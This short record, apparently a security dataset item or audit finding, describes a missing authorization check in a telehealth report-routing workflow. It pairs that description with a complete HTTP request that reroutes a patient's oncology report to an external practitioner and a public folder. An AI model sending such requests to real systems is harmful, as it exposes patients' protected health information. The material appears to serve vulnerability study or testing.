diagnosis: The Temporal activity reassigns sensitive diagnostic laboratory reports to arbitrary practitioner IDs and folder destinations. It executes without verifying whether the initiating doctor or requester has an active clinical care relationship with the patient whose report is being routed, risking unauthorized sharing of protected health information.
exploit_request:
POST /api/telehealth/workflows/route-report HTTP/1.1
Host: clinic.telehealthhub.org
Authorization: Bearer <practitioner_jwt>
Content-Type: application/json

{"reportId": "rep_oncology_99182", "targetPractitionerId": "doc_external_third_party", "clinicalFolderId": "fld_public_review"}
